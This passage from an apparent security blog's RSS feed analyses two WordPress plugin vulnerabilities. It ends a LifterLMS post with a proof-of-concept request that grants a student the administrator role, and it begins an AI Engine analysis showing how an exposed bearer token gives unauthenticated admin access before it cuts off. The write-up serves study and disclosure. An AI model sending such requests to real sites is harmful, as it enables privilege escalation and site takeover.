viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in as a student account&lt;/li&gt;&#xA;&lt;li&gt;Open the browser console and retrieve the nonce using &lt;code&gt;wpApiSettings.nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Send the following request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/llms/v1/students/8 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: student_cookie&#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;roles=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/result.png&#39; alt=&#34;Result&#34; height=&#34;912&#34; width=&#34;1540&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from a &lt;strong&gt;decoupling between permission validation and data mutation&lt;/strong&gt;, allowing the &lt;code&gt;roles&lt;/code&gt; field to be processed after passing initial access checks. This enables authenticated users to elevate their own privileges through the REST API.&lt;/p&gt;&#xA;&lt;p&gt;The patch resolves the issue by enforcing WordPress’s native permission checks before allowing any role modification.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Sensitive fields must never be processed outside permission checks.&lt;/li&gt;&#xA;&lt;li&gt;Role assignments must always rely on WordPress core capability validation.&lt;/li&gt;&#xA;&lt;li&gt;Permission checks must apply across the entire execution flow, not only at entry points.&lt;/li&gt;&#xA;&lt;li&gt;Improper separation of validation and execution logic can lead to critical privilege escalation vulnerabilities.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/lifterlms/vulnerability/wordpress-lifterlms-plugin-various-versions-authenticated-student-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin &amp;lt;= 9.1.0 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11749 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-01-cve-2025-11749/</link>
      <pubDate>Thu, 01 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-01-cve-2025-11749/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The AI Engine plugin for WordPress is affected by a &lt;strong&gt;Sensitive Information Disclosure&lt;/strong&gt; vulnerability in all versions up to &lt;strong&gt;3.1.3&lt;/strong&gt;, via the REST API endpoint &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. This vulnerability exposes a &lt;strong&gt;Bearer Token&lt;/strong&gt; when the &lt;strong&gt;“No-Auth URL”&lt;/strong&gt; option is enabled. This allows unauthenticated attackers to obtain the bearer token and gain access to a valid session, enabling actions such as &lt;strong&gt;creating a new administrator account&lt;/strong&gt;, resulting in &lt;strong&gt;privilege escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11749&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11749&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;    // Load bearer token if not already loaded&#xA;    if ( $this-&amp;gt;bearer_token === null ) {&#xA;      $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_bearer_token&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // No-Auth URL endpoints (with token in path)&#xA;    $noauth_enabled = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_noauth_url&amp;#39; );&#xA;    if ( $noauth_enabled &amp;amp;&amp;amp; !empty( $this-&amp;gt;bearer_token ) ) {&#xA;        ...&#xA;        register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/messages&amp;#39;, [&#xA;            &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;handle_message&amp;#39; ],&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;                return $this-&amp;gt;handle_noauth_access( $request );&#xA;            },&#xA;        ] );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The conditions for these APIs to work are:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Bearer Token&lt;/strong&gt; must be set (must have a value).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No-Auth URL&lt;/strong&gt; option must be enabled.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;These settings can be configured in the Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;) as follows:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#34; title=&#34;Setup Bearer Token and No-Auth URL&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Setup Bearer Token and No-Auth URL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#39; alt=&#34;Enable&#34; height=&#34;472&#34; width=&#34;868&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setup Bearer Token and No-Auth URL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We set the &lt;strong&gt;Bearer Token&lt;/strong&gt; to any arbitrary string, for example: &lt;code&gt;aaaaaaaaaa&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This string acts as a &lt;strong&gt;secret key&lt;/strong&gt; to access these APIs.&#xA;Only those who know this value should be able to call the corresponding endpoints.&lt;/p&gt;&#xA;&lt;p&gt;However, according to the CVE description, this becomes part of the vulnerability — even unauthenticated users can obtain the &lt;strong&gt;Bearer Token&lt;/strong&gt;, meaning it is no longer secret.&lt;/p&gt;&#xA;&lt;p&gt;Everything is &lt;strong&gt;exposed&lt;/strong&gt; when accessing &lt;code&gt;/wp-json&lt;/code&gt;. WordPress returns the &lt;strong&gt;REST API Index&lt;/strong&gt;, which lists all available APIs, including those containing the &lt;strong&gt;Bearer Token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#34; title=&#34;Bearer Token exposed in response&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/exposed.png&#34; data-sub-html=&#34;&lt;h2&gt;Exposed&lt;/h2&gt;&lt;p&gt;Bearer Token exposed in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#39; alt=&#34;Exposed&#34; height=&#34;877&#34; width=&#34;1570&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bearer Token exposed in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;All users (including &lt;strong&gt;unauthenticated users&lt;/strong&gt;) can access &lt;code&gt;/wp-json&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;strong&gt;v3.1.4 patch&lt;/strong&gt; adds &lt;code&gt;&#39;show_in_rest&#39; =&amp;gt; false&lt;/code&gt; when registering the API, in order to &lt;strong&gt;hide the endpoints from &lt;code&gt;/wp-json&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#39; alt=&#34;Patch&#34; height=&#34;601&#34; width=&#34;1770&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This helps to:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hide APIs from the REST listing&lt;/li&gt;&#xA;&lt;li&gt;Reduce the likelihood of enumeration&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;However:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The API is still accessible if the URL is known&lt;/li&gt;&#xA;&lt;li&gt;This does not replace proper authentication&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 This is merely security by obscurity, not real protection.&lt;/p&gt;&#xA;&lt;p&gt;The API is registered with &lt;code&gt;permission_callback&lt;/code&gt; set to &lt;code&gt;handle_noauth_access&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_noauth_access( $request ) {&#xA;    // For no-auth URLs, the token is already verified by being in the URL path&#xA;    // Double-check that the route actually contains the token&#xA;    $route = $request-&amp;gt;get_route();&#xA;    if ( strpos( $route, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/&amp;#39; ) === false ) {&#xA;      if ( $this-&amp;gt;logging ) {&#xA;        error_log( &amp;#39;[AI Engine MCP] ❌ Invalid no-auth URL access attempt.&amp;#39; );&#xA;      }&#xA;      return false;&#xA;    }&#xA;&#xA;    // Set the current user to admin since token is valid&#xA;    if ( $admin = $this-&amp;gt;core-&amp;gt;get_admin_user() ) {&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function validates the &lt;strong&gt;Bearer Token&lt;/strong&gt;. If valid, it executes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This assigns the current user as admin, allowing the request to proceed with full administrative privileges. Once the request finishes, the admin context ends.&lt;/p&gt;&#xA;&lt;p&gt;When accessing &lt;code&gt;/wp-json/mcp/v1/aaaaaaaaaa/messages&lt;/code&gt;, the &lt;code&gt;handle_message&lt;/code&gt; callback is invoked:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_message( WP_REST_Request $request ) {&#xA;    ...&#xA;    $raw = $request-&amp;gt;get_body();&#xA;    $dat = json_decode( $raw, true );&#xA;    ...&#xA;    $id = $dat[&amp;#39;id&amp;#39;] ?? null;&#xA;    $method = $dat[&amp;#39;method&amp;#39;] ?? null;&#xA;    ...&#xA;    // It&amp;#39;s a notification, no ID = no reply&#xA;    if ( $id === null &amp;amp;&amp;amp; $method !== null ) {&#xA;      return new WP_REST_Response( null, 204 );&#xA;    }&#xA;    ...&#xA;    try {&#xA;&#xA;      $reply = null;&#xA;&#xA;      #region Methods switch&#xA;      switch ( $method ) {&#xA;        ...&#xA;        case &amp;#39;tools/call&amp;#39;:&#xA;          $params = $dat[&amp;#39;params&amp;#39;] ?? [];&#xA;          $tool = $params[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;          $arguments = $params[&amp;#39;arguments&amp;#39;] ?? [];&#xA;&#xA;          if ( $this-&amp;gt;logging ) {&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] 🔧 tools/call - Tool: &amp;#39; . $tool );&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] 🔧 tools/call - Arguments: &amp;#39; . wp_json_encode( $arguments ) );&#xA;          }&#xA;&#xA;          try {&#xA;            $reply = $this-&amp;gt;execute_tool( $tool, $arguments, $id );&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ✅ tools/call - Success for tool: &amp;#39; . $tool );&#xA;            }&#xA;          }&#xA;          catch ( Exception $e ) {&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ❌ tools/call - Error: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;            }&#xA;            throw $e;&#xA;          }&#xA;          break;&#xA;        ...&#xA;      }&#xA;      #endregion&#xA;&#xA;      if ( $reply ) {&#xA;        // Don&amp;#39;t log response queuing - it&amp;#39;s too noisy&#xA;        $this-&amp;gt;store_message( $sess, $reply );&#xA;      }&#xA;&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      $this-&amp;gt;queue_error( $sess, $id, -32603, &amp;#39;Internal error&amp;#39;, $e-&amp;gt;getMessage() );&#xA;    }&#xA;&#xA;    return new WP_REST_Response( null, 204 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function receives a JSON request, parses it, executes the corresponding action, and returns a response if necessary.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If it is a notification (no &lt;code&gt;id&lt;/code&gt;) → no response → HTTP 204&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($id === null &amp;amp;&amp;amp; $method !== null)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If &lt;code&gt;method&lt;/code&gt; is &lt;code&gt;tools/call&lt;/code&gt;, it extracts parameters and calls &lt;code&gt;execute_tool( $tool, $arguments, $id );&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Current request body:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function execute_tool( $tool, $args, $id ) {&#xA;    try {&#xA;      ...&#xA;      $filtered = apply_filters( &amp;#39;mwai_mcp_callback&amp;#39;, null, $tool, $args, $id, $this );&#xA;      ...&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      return $this-&amp;gt;rpc_error( $id, -32603, $e-&amp;gt;getMessage() );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;execute_tool&lt;/code&gt; function calls callbacks registered to the &lt;code&gt;mwai_mcp_callback&lt;/code&gt; filter with the provided parameters.&lt;/p&gt;&#xA;&lt;p&gt;Searching for &lt;code&gt;mwai_mcp_callback&lt;/code&gt; reveals it is registered inside the &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt; class, which directly affects this vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#34; title=&#34;Filter mwai_mcp_callback&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Filter mwai_mcp_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#39; alt=&#34;Filter&#34; height=&#34;422&#34; width=&#34;1740&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter mwai_mcp_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This filter is only active if the &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt; class is initialized.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#34; title=&#34;Meow_MWAI_Labs_MCP_Core initialized&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/init.png&#34; 